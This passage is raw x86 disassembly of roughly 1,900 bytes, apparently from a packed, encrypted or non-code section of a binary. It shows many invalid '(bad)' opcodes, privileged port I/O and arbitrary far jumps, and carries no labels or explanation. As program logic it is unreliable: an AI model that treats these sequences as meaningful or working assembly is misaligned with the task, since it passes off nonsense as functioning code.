  406888:	xor    DWORD PTR [eax+0x65f1b9e3],ebx
  40688e:	jno    0x4068c6
  406890:	hlt    
  406891:	mov    esi,0xd47b3259
  406896:	dec    ecx
  406897:	aad    0x64
  406899:	out    dx,al
  40689a:	xchg   BYTE PTR [ebp-0x57e6d630],ch
  4068a0:	jo     0x406911
  4068a2:	(bad)  
  4068a3:	push   0x6f
  4068a5:	sbb    eax,0x1f59918
  4068aa:	ins    BYTE PTR es:[edi],dx
  4068ab:	cli    
  4068ac:	inc    esp
  4068ad:	push   ss
  4068ae:	ins    DWORD PTR es:[edi],dx
  4068af:	(bad)  
  4068b0:	in     al,dx
  4068b1:	retf   
  4068b2:	and    DWORD PTR [ecx+0x2e7601c4],ebp
  4068b8:	and    ch,dh
  4068ba:	cmp    DWORD PTR [esi+0x16bdb117],ebx
  4068c0:	and    BYTE PTR [esi],bl
  4068c2:	mov    dh,0x78
  4068c4:	push   0x79f6ae0
  4068c9:	inc    edx
  4068ca:	adc    eax,0x70a434fe
  4068cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068d0:	pop    ecx
  4068d1:	aaa    
  4068d2:	pop    ds
  4068d3:	scas   al,BYTE PTR es:[edi]
  4068d4:	sub    cl,BYTE PTR [eax-0x69]
  4068d7:	jmp    0xcadab810
  4068dc:	out    dx,al
  4068dd:	cmp    al,0x2a
  4068df:	fiadd  WORD PTR [ecx-0x12]
  4068e2:	xchg   esp,eax
  4068e3:	pop    ds
  4068e4:	cli    
  4068e5:	repz pop ebp
  4068e7:	jge    0x406898
  4068e9:	inc    esp
  4068ea:	je     0x406898
  4068ec:	nop
  4068ed:	int    0x27
  4068ef:	out    0xe7,al
  4068f1:	cmp    DWORD PTR [esi],edi
  4068f3:	cmp    DWORD PTR [edx],eax
  4068f5:	es dec esp
  4068f7:	sbb    al,0xa8
  4068f9:	add    BYTE PTR [ebp-0x7a1f27d9],bl
  4068ff:	mov    al,0x3b
  406901:	push   0x994ae39a
  406906:	pop    ebx
  406907:	rcr    DWORD PTR [ebp+0x9ceb4b0],cl
  40690d:	out    0xd4,eax
  40690f:	sbb    ch,BYTE PTR [ebx+0x20]
  406912:	jne    0x4068d9
  406914:	lock scas al,BYTE PTR es:[edi]
  406916:	mov    ah,0x45
  406918:	int    0xb6
  40691a:	icebp  
  40691b:	dec    eax
  40691c:	(bad)  
  40691d:	sti    
  40691e:	out    0x57,al
  406920:	call   0x409b:0x99ee713a
  406927:	or     DWORD PTR ds:0xd6540d7c,esp
  40692d:	pop    edi
  40692e:	arpl   WORD PTR [edi+edx*8],bx
  406931:	in     eax,dx
  406932:	mov    ds:0x4cfe54c4,eax
  406937:	xor    edx,DWORD PTR [esi+0x74]
  40693a:	adc    esp,DWORD PTR [ebx]
  40693c:	repz jg 0x4068f9
  40693f:	add    bl,0x0
  406942:	scas   eax,DWORD PTR es:[edi]
  406943:	mov    ebx,0xbf6b2fd7
  406948:	xor    edi,DWORD PTR [eax]
  40694a:	add    ecx,DWORD PTR [ecx+0xc]
  40694d:	leave  
  40694e:	jae    0x4069a2
  406950:	test   eax,0x78546c55
  406955:	scas   al,BYTE PTR es:[edi]
  406956:	xor    al,ah
  406958:	mov    ch,0x26
  40695a:	push   0xcf793c68
  40695f:	sub    al,0xa4
  406961:	inc    edi
  406962:	outs   dx,BYTE PTR ds:[esi]
  406963:	popf   
  406964:	mov    al,0x12
  406966:	fmul   QWORD PTR [edx-0x306e5318]
  40696c:	(bad)
  40696f:	fadd   st,st(4)
  406971:	mov    al,ds:0x250897b2
  406976:	dec    esi
  406977:	jg     0x4069b1
  406979:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40697a:	xor    ah,BYTE PTR [ecx-0x75c20848]
  406980:	out    dx,al
  406981:	mov    ebx,0x95b2555a
  406986:	outs   dx,BYTE PTR ds:[esi]
  406987:	cli    
  406988:	dec    DWORD PTR [esi+0x42]
  40698b:	stc    
  40698c:	sbb    ecx,0xffffff81
  40698f:	or     BYTE PTR [edx+0x74],dl
  406992:	clc    
  406993:	stc    
  406994:	je     0x406a03
  406996:	mov    dl,0xd3
  406998:	in     eax,0x87
  40699a:	stos   DWORD PTR es:[edi],eax
  40699b:	sub    BYTE PTR [ebp+edi*1-0x3fd7b945],bl
  4069a2:	mov    ebp,0x22f7a112
  4069a7:	mov    cl,0x2c
  4069a9:	sar    DWORD PTR [edi-0x76069ee],1
  4069af:	outs   dx,DWORD PTR ds:[esi]
  4069b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069b1:	inc    edi
  4069b2:	repnz test dl,dh
  4069b5:	stos   DWORD PTR es:[edi],eax
  4069b6:	clc    
  4069b7:	pop    edi
  4069b8:	loop   0x40697a
  4069ba:	jno    0x40698c
  4069bc:	cmp    esi,ecx
  4069be:	sub    dl,BYTE PTR [ecx+0x61019d0e]
  4069c4:	mov    BYTE PTR [edx],bl
  4069c6:	test   al,0x2d
  4069c8:	std    
  4069c9:	ss sub eax,0xccbd762
  4069cf:	or     ebx,DWORD PTR [eax+eiz*8-0x3e]
  4069d3:	xor    eax,0x5fe1ed7a
  4069d8:	cmp    eax,0x29a37be1
  4069de:	add    DWORD PTR [edx-0x2b],ebx
  4069e1:	in     eax,0xc5
  4069e3:	jbe    0x4069a2
  4069e5:	add    esp,DWORD PTR [ecx-0x23]
  4069e8:	clc    
  4069e9:	aaa    
  4069ea:	pop    esp
  4069eb:	cmp    al,BYTE PTR [eax]
  4069ed:	and    edi,DWORD PTR [edx-0x3710f860]
  4069f3:	mov    ebp,esp
  4069f5:	xor    ebx,DWORD PTR [ebp-0x77f34e60]
  4069fb:	dec    esi
  4069fc:	jmp    0x4069fd
  4069fe:	and    al,0x23
  406a00:	aas    
  406a01:	popf   
  406a02:	or     al,0x5
  406a04:	sti    
  406a05:	push   0x4c
  406a07:	loope  0x40699c
  406a09:	push   ecx
  406a0a:	add    ah,bl
  406a0c:	jmp    0x9ab4:0x39ee9d6c
  406a13:	push   ecx
  406a14:	sahf   
  406a15:	and    esp,DWORD PTR ds:0xa1283e64
  406a1b:	lods   eax,DWORD PTR ds:[esi]
  406a1c:	and    eax,DWORD PTR [edx-0x3b]
  406a1f:	xchg   edx,eax
  406a20:	pop    ebp
  406a21:	xor    dl,BYTE PTR [edi]
  406a23:	jmp    0xe225:0x7ae82e3b
  406a2a:	fwait
  406a2b:	adc    esp,esp
  406a2d:	jle    0x4069d4
  406a2f:	sub    edi,eax
  406a31:	aam    0xd3
  406a33:	retf   
  406a34:	loopne 0x406aab
  406a36:	and    BYTE PTR [ebx+0x1045fa70],al
  406a3c:	test   al,0xe6
  406a3e:	call   FWORD PTR [edx+0x44e3982]
  406a44:	sbb    eax,0xbec5b7f
  406a49:	out    dx,al
  406a4a:	or     edi,edi
  406a4c:	pop    es
  406a4d:	dec    edi
  406a4e:	xchg   BYTE PTR [esi],ch
  406a50:	push   esp
  406a51:	loopne 0x406a37
  406a53:	sbb    edx,DWORD PTR [eax]
  406a55:	cmp    al,0x65
  406a57:	push   ss
  406a58:	shl    BYTE PTR [eax-0x704c4c08],0x22
  406a5f:	sar    ch,0xb4
  406a62:	inc    ecx
  406a63:	sbb    BYTE PTR [edi+eiz*8],bl
  406a66:	lds    esi,FWORD PTR [edi-0x175bb8ad]
  406a6c:	repnz loopne 0x406ac5
  406a6f:	(bad)  [eax+0x78ceba72]
  406a75:	and    eax,0xf3ce4555
  406a7a:	and    al,BYTE PTR [edi-0x635de466]
  406a80:	test   BYTE PTR [edx+esi*2-0x78],ah
  406a84:	push   es
  406a85:	adc    eax,DWORD PTR [eax]
  406a87:	sub    BYTE PTR [eax-0x453fcaec],dl
  406a8d:	xor    eax,0xba7c17ef
  406a92:	scas   eax,DWORD PTR es:[edi]
  406a93:	mov    edx,0x18eaafba
  406a98:	mov    eax,0x54f714d8
  406a9d:	in     eax,dx
  406a9e:	ja     0x406a6e
  406aa0:	xchg   esi,eax
  406aa1:	(bad)  
  406aa2:	les    ebx,FWORD PTR [ebx+0x7e]
  406aa5:	js     0x406a9f
  406aa7:	fucomi st,st(7)
  406aa9:	mov    dl,0xb9
  406aab:	cmp    dl,ch
  406aad:	aad    0xb6
  406aaf:	push   ss
  406ab0:	das    
  406ab1:	fbld   TBYTE PTR [ecx-0x4607dc4e]
  406ab7:	cmp    ebx,0x48
  406aba:	popa   
  406abb:	mov    WORD PTR [eax-0x5e],?
  406abe:	(bad)  
  406abf:	mov    esp,0x2ef75a60
  406ac4:	jmp    DWORD PTR [edi-0x1e8657e6]
  406aca:	retf   
  406acb:	mov    ebp,0x5beb6068
  406ad0:	popf   
  406ad1:	mov    ah,0x7
  406ad3:	sbb    al,0x8c
  406ad5:	cwde   
  406ad6:	out    dx,eax
  406ad7:	sub    edi,esi
  406ad9:	outs   dx,BYTE PTR ds:[esi]
  406ada:	add    DWORD PTR [edi-0x9],ebx
  406add:	push   es
  406ade:	mov    esp,0x7b04240d
  406ae3:	cmovae eax,DWORD PTR [ebp-0x24d17993]
  406aea:	sbb    al,0x5a
  406aec:	inc    esi
  406aed:	inc    edi
  406aee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406aef:	shl    BYTE PTR [eax],cl
  406af1:	push   DWORD PTR [ebp+0x5e]
  406af4:	fs aam 0x45
  406af7:	add    eax,0x3763c7
  406afc:	sti    
  406afd:	push   es
  406afe:	push   ecx
  406aff:	mov    ds:0x4866afa3,al
  406b04:	push   ecx
  406b05:	jl     0x406b72
  406b07:	pop    es
  406b08:	cmp    DWORD PTR [ecx],eax
  406b0a:	rol    ah,cl
  406b0c:	push   ss
  406b0d:	je     0x406ab7
  406b0f:	cwde   
  406b10:	out    0xdd,eax
  406b12:	inc    esi
  406b13:	pusha  
  406b14:	lahf   
  406b15:	cmp    bh,al
  406b17:	scas   al,BYTE PTR es:[edi]
  406b18:	xchg   BYTE PTR [esi-0x13],al
  406b1b:	jle    0x406afc
  406b1d:	mov    eax,0x1b08d23d
  406b22:	stos   BYTE PTR es:[edi],al
  406b23:	xchg   ecx,eax
  406b24:	dec    ebx
  406b25:	mov    eax,ds:0x564034a7
  406b2a:	mov    ecx,0xde1a5179
  406b2f:	xchg   BYTE PTR [ebx-0x3319050],dl
  406b35:	push   ecx
  406b36:	adc    DWORD PTR [ecx],0x6e
  406b39:	pop    edx
  406b3a:	cdq    
  406b3b:	pusha  
  406b3c:	cmc    
  406b3d:	div    BYTE PTR [ecx+0x6c]
  406b40:	test   al,0x3c
  406b42:	leave  
  406b43:	into   
  406b44:	add    eax,0xd0b339b6
  406b49:	adc    DWORD PTR [esi],esi
  406b4b:	add    eax,0xa739182e
  406b50:	add    dl,BYTE PTR [eax-0x3dbae685]
  406b56:	mov    bl,0x12
  406b58:	outs   dx,DWORD PTR ds:[esi]
  406b59:	mov    bl,0x2d
  406b5b:	jecxz  0x406af1
  406b5d:	mov    DWORD PTR fs:[ebp+0x6b],ecx
  406b61:	mul    BYTE PTR ds:0x7ab36220
  406b67:	push   0x16787068
  406b6c:	add    DWORD PTR [ecx+0x505443ef],ebp
  406b72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b73:	lods   al,BYTE PTR ds:[esi]
  406b74:	(bad)
  406b77:	retf   
  406b78:	out    dx,al
  406b79:	xchg   BYTE PTR [esi+0x10],bh
  406b7c:	pop    eax
  406b7d:	out    dx,al
  406b7e:	pushf  
  406b7f:	loopne 0x406b38
  406b81:	mov    eax,0xc420cdb5
  406b86:	push   esp
  406b87:	xor    DWORD PTR es:[esi-0xd889779],ebx
  406b8e:	mov    dh,0xc9
  406b90:	ss out 0x7a,eax
  406b93:	stc    
  406b94:	mov    cl,0x28
  406b96:	sbb    esi,DWORD PTR [eax]
  406b98:	sbb    cl,dl
  406b9a:	rol    BYTE PTR [ebx],cl
  406b9c:	mov    ch,0xb4
  406b9e:	in     eax,0x29
  406ba0:	and    DWORD PTR [eax],esp
  406ba2:	mov    ds:0xf82fb8e3,eax
  406ba7:	xor    bh,BYTE PTR [ebx-0x67bd958d]
  406bad:	loope  0x406bca
  406baf:	out    dx,eax
  406bb0:	mov    bh,0x65
  406bb2:	mov    ch,0x5c
  406bb4:	push   es
  406bb5:	jmp    0x406b7c
  406bb7:	sub    al,0x4d
  406bb9:	mov    DWORD PTR [edi-0x249d951a],eax
  406bbf:	add    ebp,ebp
  406bc1:	repnz jecxz 0x406bdf
  406bc4:	(bad)  
  406bc5:	std    
  406bc6:	je     0x406b96
  406bc8:	stos   BYTE PTR es:[edi],al
  406bc9:	jg     0x406b4d
  406bcb:	xchg   edx,eax
  406bcc:	loopne 0x406bd5
  406bce:	push   cs
  406bcf:	jge    0x406b6c
  406bd1:	cmp    BYTE PTR [edi+0x7ade7e02],ch
  406bd7:	enter  0x9806,0x3a
  406bdb:	popf   
  406bdc:	mov    esp,DWORD PTR [esi]
  406bde:	leave  
  406bdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406be0:	jo     0x406c2d
  406be2:	cmp    DWORD PTR [edi-0x43],0x52
  406be6:	icebp  
  406be7:	loop   0x406b6c
  406be9:	push   cs
  406bea:	pop    ebx
  406beb:	push   0xffffff87
  406bed:	xor    al,0x57
  406bef:	or     edx,DWORD PTR [edx+0x2a]
  406bf2:	pop    ecx
  406bf3:	add    al,0x22
  406bf5:	pop    esp
  406bf6:	aas    
  406bf7:	jnp    0x406c64
  406bf9:	dec    ecx
  406bfa:	pusha  
  406bfb:	div    DWORD PTR fs:[ebp+0x2d9f6d9f]
  406c02:	jmp    0x34c30a68
  406c07:	out    dx,eax
  406c08:	jmp    0x406c20
  406c0a:	aaa    
  406c0b:	inc    esp
  406c0c:	add    cl,BYTE PTR [esi-0x6b]
  406c0f:	test   DWORD PTR [ebp+0x79d79886],esi
  406c15:	stc    
  406c16:	ss ins DWORD PTR es:[edi],dx
  406c18:	mov    eax,ds:0x20a493e0
  406c1d:	adc    al,0x13
  406c1f:	push   eax
  406c20:	pop    edi
  406c21:	mov    ebx,0xa58cb299
  406c26:	mov    ebp,0x3591ab53
  406c2b:	std    
  406c2c:	or     DWORD PTR [eax-0x6daed6e2],esi
  406c32:	(bad)  
  406c33:	js     0x406c87
  406c35:	out    0x66,al
  406c37:	mov    dl,0x9a
  406c39:	mov    dl,BYTE PTR [ebp+0x4e7b2127]
  406c3f:	inc    ecx
  406c40:	sbb    eax,0x3c93a8e9
  406c45:	sub    al,0xcb
  406c47:	xor    BYTE PTR [ebx-0x66],bl
  406c4a:	push   0xffffffcd
  406c4c:	jecxz  0x406c07
  406c4e:	popf   
  406c4f:	sbb    eax,DWORD PTR [esi-0x57]
  406c52:	ror    DWORD PTR [edi+0x27927ee2],cl
  406c58:	sub    al,0xd9
  406c5a:	ss dec esi
  406c5c:	cmc    
  406c5d:	fwait
  406c5e:	leave  
  406c5f:	add    bh,dh
  406c61:	and    ah,dh
  406c63:	into   
  406c64:	hlt    
  406c65:	sub    al,0xb7
  406c67:	dec    esp
  406c68:	and    eax,0x8eb0168c
  406c6d:	cmp    al,0xa4
  406c6f:	cmp    DWORD PTR [ebx-0x478e5a24],edx
  406c75:	bound  edi,QWORD PTR [ebp-0x6]
  406c78:	in     al,0x9a
  406c7a:	sub    DWORD PTR [edi-0x29ae9e42],edx
  406c80:	mov    edi,0xc093e164
  406c85:	xchg   edi,eax
  406c86:	cmp    ecx,ebp
  406c88:	cmp    eax,0x2adeacca
  406c8d:	adc    al,0x71
  406c8f:	pop    es
  406c90:	and    al,BYTE PTR gs:0x24210c1
  406c97:	push   esp
  406c98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c99:	out    dx,eax
  406c9a:	mov    edi,0xb279a347
  406c9f:	(bad)  
  406ca0:	and    BYTE PTR [ebx-0x7a],ch
  406ca3:	jmp    0x8f09:0xcbd50543
  406caa:	mov    edi,0xa26e5724
  406caf:	out    0xaa,al
  406cb1:	xchg   edx,eax
  406cb2:	sbb    al,0xad
  406cb4:	call   0xa8dedcb7
  406cb9:	mov    esi,DWORD PTR [ebp+0x4]
  406cbc:	daa    
  406cbd:	stos   BYTE PTR es:[edi],al
  406cbe:	push   ss
  406cbf:	xchg   ebp,eax
  406cc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cc1:	call   0x44d784b9
  406cc6:	aam    0x25
  406cc8:	add    DWORD PTR [ebx+ebp*8],0x48
  406ccc:	jno    0x406d36
  406cce:	fstp   QWORD PTR [edx+0x40085bf8]
  406cd4:	aam    0xb3
  406cd6:	dec    eax
  406cd7:	retf   0xf143
  406cda:	mov    BYTE PTR [ebx],bh
  406cdc:	cmp    DWORD PTR ds:0x7c4f5540,ebx
  406ce2:	jecxz  0x406d07
  406ce4:	push   0x1e
  406ce6:	aaa    
  406ce7:	xor    eax,0xda3a83dd
  406cec:	sub    BYTE PTR [eax],ch
  406cee:	test   DWORD PTR [eax+0x345149ad],eax
  406cf4:	lahf   
  406cf5:	jnp    0x406cd6
  406cf7:	jl     0x406cdf
  406cf9:	jno    0x406ca5
  406cfb:	outs   dx,DWORD PTR ds:[esi]
  406cfc:	and    BYTE PTR [eax],dh
  406cfe:	push   es
  406cff:	pop    edi
  406d00:	inc    ebx
  406d01:	imul   DWORD PTR [esi]
  406d03:	lods   eax,DWORD PTR ds:[esi]
  406d04:	xor    DWORD PTR [ecx+eiz*2-0x5299c8f7],ebp
  406d0b:	enter  0xa348,0xdf
  406d0f:	add    ch,0xcb
  406d12:	and    DWORD PTR [ebp+0x43],edi
  406d15:	add    dh,BYTE PTR [eax-0x5768a76c]
  406d1b:	jb     0x406d59
  406d1d:	imul   edi,DWORD PTR [ecx],0x14
  406d20:	adc    ebx,DWORD PTR [ebp+0x419bb631]
  406d26:	es (bad) 
  406d28:	mov    ah,0x78
  406d2a:	aam    0xa2
  406d2c:	stos   DWORD PTR es:[edi],eax
  406d2d:	fisub  DWORD PTR ds:0xe82001b
  406d33:	push   ds
  406d34:	aad    0x50
  406d36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d37:	cmp    eax,0x53c32739
  406d3c:	pop    eax
  406d3d:	and    BYTE PTR ds:0x26360e45,dh
  406d43:	inc    ebp
  406d44:	xor    ah,BYTE PTR [edx*2+0x675cf642]
  406d4b:	xchg   ebp,ebp
  406d4d:	cmp    bh,ah
  406d4f:	xchg   ebx,eax
  406d50:	imul   edi,ecx,0xd767d876
  406d56:	inc    ecx
  406d57:	(bad)  
  406d58:	scas   eax,DWORD PTR es:[edi]
  406d59:	fwait
  406d5a:	push   0x894ebd3f
  406d5f:	(bad)  
  406d60:	ds aam 0xc3
  406d63:	shl    eax,cl
  406d65:	mov    eax,ds:0x2a9f0f33
  406d6a:	mov    cl,0x79
  406d6c:	ror    ecx,0x6c
  406d6f:	int    0xb3
  406d71:	xor    ebx,DWORD PTR [ebx+edx*4]
  406d74:	cmp    al,bh
  406d76:	ds out dx,al
  406d78:	or     eax,0x3482c7b6
  406d7d:	mov    bh,0x36
  406d7f:	xchg   edi,ebx
  406d81:	and    DWORD PTR [eax-0xb],edx
  406d84:	into   
  406d85:	push   es
  406d86:	jg     0x406dbf
  406d88:	dec    ebx
  406d89:	and    eax,0x1e1728f0
  406d8e:	mov    al,BYTE PTR [ebp+0x50]
  406d91:	gs retf 
  406d93:	ins    BYTE PTR es:[edi],dx
  406d94:	xor    BYTE PTR [edx-0x38],ah
  406d97:	sub    eax,DWORD PTR [eax-0x50d10584]
  406d9d:	mov    BYTE PTR [esi+0x6d],dl
  406da0:	ret    
  406da1:	test   BYTE PTR [ebx-0x3a],dl
  406da4:	cmp    BYTE PTR [ebx],ah
  406da6:	jp     0x406e18
  406da8:	cmp    DWORD PTR [ebx-0x4f],edi
  406dab:	and    eax,0xffffffcc
  406dae:	and    ch,BYTE PTR [edx+0x4bb40d5e]
  406db4:	and    al,0x1
  406db6:	mov    al,0x9b
  406db8:	inc    esi
  406db9:	mov    ebx,DWORD PTR [ebx]
  406dbb:	in     al,0xcd
  406dbd:	dec    ebp
  406dbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dbf:	bound  edi,QWORD PTR [esi]
  406dc1:	dec    esi
  406dc2:	icebp  
  406dc3:	cmp    al,0x1f
  406dc5:	pop    ds
  406dc6:	xor    DWORD PTR [eax-0xd],edx
  406dc9:	mov    fs,WORD PTR [ebx-0x34737d73]
  406dcf:	repz add DWORD PTR ds:0xdcbbbb4f,0x2f
  406dd7:	daa    
  406dd8:	pusha  
  406dd9:	fstp   QWORD PTR [edx-0x41f92c8c]
  406ddf:	popa   
  406de0:	inc    DWORD PTR [edx]
  406de2:	(bad)  
  406de3:	test   DWORD PTR [edx+0xd0a6b8a],esp
  406de9:	fild   DWORD PTR [edi+0x49]
  406dec:	sbb    DWORD PTR [ebx+0x1c],ecx
  406def:	outs   dx,BYTE PTR ds:[esi]
  406df0:	icebp  
  406df1:	test   esi,ebp
  406df3:	inc    ebx
  406df4:	mov    ah,0x8c
  406df6:	outs   dx,DWORD PTR ds:[esi]
  406df7:	jae    0x406e1b
  406df9:	push   0xcaf2eaf5
  406dfe:	scas   al,BYTE PTR es:[edi]
  406dff:	arpl   bx,si
  406e01:	ror    DWORD PTR [edx-0x31e96ab9],1
  406e07:	cs hlt 
  406e09:	add    al,0xae
  406e0b:	push   edx
  406e0c:	out    0x0,eax
  406e0e:	dec    ebx
  406e0f:	scas   al,BYTE PTR es:[edi]
  406e10:	inc    eax
  406e11:	pop    es
  406e12:	aas    
  406e13:	aam    0x2e
  406e15:	(bad)  
  406e16:	in     eax,0x22
  406e18:	sub    eax,edx
  406e1a:	pusha  
  406e1b:	inc    ebx
  406e1c:	push   ebp
  406e1d:	push   ecx
  406e1e:	jle    0x406df7
  406e20:	dec    ebx
  406e21:	repz int3 
  406e23:	scas   eax,DWORD PTR es:[edi]
  406e24:	ror    DWORD PTR [edx+eax*8+0x24],0xf4
  406e29:	sub    al,0x99
  406e2b:	and    DWORD PTR [edx+0x368e7395],0xffffffdf
  406e32:	(bad)  
  406e33:	or     al,0x92
  406e35:	dec    esi
  406e36:	test   eax,0xe53da742
  406e3b:	jnp    0x406dfb
  406e3d:	or     bh,BYTE PTR [eax+ebp*2]
  406e40:	retf   
  406e41:	imul   eax,DWORD PTR [ebp-0x28],0xffffffab
  406e45:	pop    esp
  406e46:	push   edi
  406e47:	push   ss
  406e48:	imul   ebx,DWORD PTR [edi+0x4c98762e],0x65
  406e4f:	loope  0x406e15
  406e51:	dec    eax
  406e52:	hlt    
  406e53:	jecxz  0x406df5
  406e55:	jno    0x406e77
  406e57:	sub    eax,0x9e7793ef
  406e5c:	push   ds
  406e5d:	dec    ebx
  406e5e:	mov    DWORD PTR [esi-0x1],ecx
  406e61:	stos   BYTE PTR es:[edi],al
  406e62:	pop    edx
  406e63:	sub    al,0x5e
  406e65:	je     0x406ea0
  406e67:	enter  0x1de4,0x19
  406e6b:	mov    ?,WORD PTR [edi*2+0xad478]
  406e72:	mov    esi,0x6c3e87ce
  406e77:	je     0x406e17
  406e79:	out    0xd1,al
  406e7b:	push   esi
  406e7c:	cs addr16 pop bx
  406e80:	enter  0x6b03,0x12
  406e84:	jns    0x406ed6
  406e86:	out    dx,al
  406e87:	cmp    ebp,DWORD PTR [esi+0xe]
  406e8a:	jg     0x406f08
  406e8c:	mov    DWORD PTR [eax+0x43],ebp
  406e8f:	cdq    
  406e90:	or     dl,cl
  406e92:	sti    
  406e93:	lods   al,BYTE PTR ds:[esi]
  406e94:	ja     0x406e30
  406e96:	stos   BYTE PTR es:[edi],al
  406e97:	aas    
  406e98:	cmp    eax,DWORD PTR [bx+di-0x5092]
  406e9d:	xchg   BYTE PTR [ecx-0x6d],dh
  406ea0:	cld    
  406ea1:	and    eax,DWORD PTR [esi-0x3f]
  406ea4:	jp     0x406f0a
  406ea6:	scas   al,BYTE PTR es:[edi]
  406ea7:	or     dh,BYTE PTR [esi]
  406ea9:	inc    ecx
  406eaa:	mov    DWORD PTR [ebp+0x78],ecx
  406ead:	lods   al,BYTE PTR ds:[esi]
  406eae:	adc    DWORD PTR [edi],0xffffffc2
  406eb1:	pop    eax
  406eb2:	sub    eax,0x8a1a12ce
  406eb7:	fisubr DWORD PTR [edx+0x5f]
  406eba:	mov    ebp,0xe9fbd2fb
  406ebf:	icebp  
  406ec0:	add    eax,0x8eed087f
  406ec5:	cwde   
  406ec6:	jl     0x406ed5
  406ec8:	dec    esp
  406ec9:	xor    edi,ecx
  406ecb:	inc    ebx
  406ecc:	sbb    al,0xf1
  406ece:	cwde   
  406ecf:	mov    ds:0x3e4a5729,eax
  406ed4:	jo     0x406f49
  406ed6:	and    BYTE PTR [ecx-0x7f7edf16],bl
  406edc:	or     al,0x3f
  406ede:	ret    0x3708
  406ee1:	push   eax
  406ee2:	adc    al,0xad
  406ee4:	stc    
  406ee5:	(bad)  
  406ee6:	sub    eax,0x5af82d7c
  406eeb:	pop    esp
  406eec:	popf   
  406eed:	(bad)  
  406eee:	dec    BYTE PTR [edi-0x7b1f9172]
  406ef4:	fisub  WORD PTR [edi+0x19]
  406ef7:	ficom  DWORD PTR [ecx+0x47f5cf0c]
  406efd:	sub    al,0x7d
  406eff:	data16 mov ch,0x33
  406f02:	outs   dx,BYTE PTR ds:[esi]
  406f03:	adc    al,0xf9
  406f05:	cmp    al,0xdd
  406f07:	sub    eax,0xed4b033a
  406f0c:	mov    ah,0x16
  406f0e:	xor    bl,al
  406f10:	lock mul DWORD PTR [edi+0x7ee2c0a7]
  406f17:	lods   al,BYTE PTR ds:[si]
  406f19:	mov    dh,0xfd
  406f1b:	dec    edx
  406f1c:	in     al,dx
  406f1d:	cdq    
  406f1e:	popf   
  406f1f:	xor    ebp,ebp
  406f21:	lods   al,BYTE PTR ds:[esi]
  406f22:	pop    edx
  406f23:	ins    DWORD PTR es:[edi],dx
  406f24:	(bad)  
  406f25:	scas   eax,DWORD PTR es:[edi]
  406f26:	sbb    edi,DWORD PTR [ebx-0x2115fab5]
  406f2c:	xchg   edx,eax
  406f2d:	jle    0x406f1d
  406f2f:	xlat   BYTE PTR ds:[ebx]
  406f30:	xor    BYTE PTR fs:[ecx+ebx*4+0x126b91a0],al
  406f38:	or     ah,al
  406f3a:	and    bl,BYTE PTR [edi-0x5c3feae1]
  406f40:	pop    ds
  406f41:	add    DWORD PTR fs:[esi],0x32ca9aee
  406f48:	or     ch,bl
  406f4a:	in     al,0x44
  406f4c:	inc    ecx
  406f4d:	push   ecx
  406f4e:	fsub   st,st(2)
  406f50:	push   eax
  406f51:	mov    ebx,0x5e38dc93
  406f56:	repz fnstsw WORD PTR [edi]
  406f59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f5a:	xchg   bx,ax
  406f5c:	pushf  
  406f5d:	mov    ebp,0x74600aa9
  406f62:	mov    bl,BYTE PTR [ebx]
  406f64:	cmp    dl,dh
  406f66:	fmul   QWORD PTR [ebp+0x2d52b9ac]
  406f6c:	sub    eax,0xbce82471
  406f71:	in     al,0x5b
  406f73:	and    edi,DWORD PTR [eax+0x11]
  406f76:	inc    eax
  406f77:	xlat   BYTE PTR ds:[ebx]
  406f78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f79:	jmp    0x406efd
  406f7b:	mov    dl,0x2d
  406f7d:	pop    esi
  406f7e:	rcl    BYTE PTR [ecx+0x5c],1
  406f81:	push   eax
  406f82:	loop   0x406f58
  406f84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f85:	(bad)  
  406f86:	ror    BYTE PTR [edx-0x20830b8a],0x6b
  406f8d:	push   esi
  406f8e:	dec    esi
  406f8f:	and    BYTE PTR [ecx+0x4e6c7945],cl
  406f95:	or     al,0x11
  406f97:	xchg   edx,eax
  406f98:	(bad)  
  406f99:	mov    edx,0x3ba49810
  406f9e:	adc    eax,0x36131c32
  406fa3:	adc    al,0xef
  406fa5:	ds and edx,edx
  406fa8:	nop
  406fa9:	dec    ebp
  406faa:	mov    bl,0xe2
  406fac:	pop    es
  406fad:	shl    DWORD PTR [ebx+eiz*1-0x2b],0x65
  406fb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406fb3:	shl    DWORD PTR [ebx+esi*2+0x2e],cl
  406fb7:	sahf   
  406fb8:	in     eax,dx
  406fb9:	jne    0x406f83
  406fbb:	test   DWORD PTR [edi],0x3faae58b
  406fc1:	and    al,0x6e
  406fc3:	dec    esi
  406fc4:	out    0xd4,eax
  406fc6:	(bad)  
  406fc8:	loope  0x406ffa
  406fca:	aad    0xaa
  406fcc:	pop    ebp
  406fcd:	jg     0x406f52
  406fcf:	cmp    al,0xa8
  406fd1:	mov    al,bl
  406fd3:	test   al,0x4f
  406fd6:	shl    BYTE PTR [eax],cl
  406fd8:	pop    DWORD PTR [ecx]
  406fda:	adc    eax,0x275a951d
  406fdf:	mov    al,ds:0x75f78d72
  406fe4:	push   eax
  406fe5:	dec    edi
  406fe6:	or     DWORD PTR [edi-0x9],esi
  406fe9:	cmp    DWORD PTR [ebp-0x34],esp
  406fec:	mov    edx,0x660ca495
  406ff1:	test   al,0x94
  406ff3:	xor    DWORD PTR [ecx-0x7c],edx
  406ff6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ff7:	pop    ecx
  406ff8:	mov    es,WORD PTR [ebp-0x38]
  406ffb:	xor    eax,ebp
  406ffd:	inc    ecx
  406ffe:	mov    dl,0xde
  407000:	jecxz  0x407030
  407002:	ficomp DWORD PTR [edi+0x78cfcbfd]
  407008:	and    eax,0xf3404786
  40700d:	xchg   DWORD PTR [ebp-0x3a149666],edx
  407013:	pop    ecx
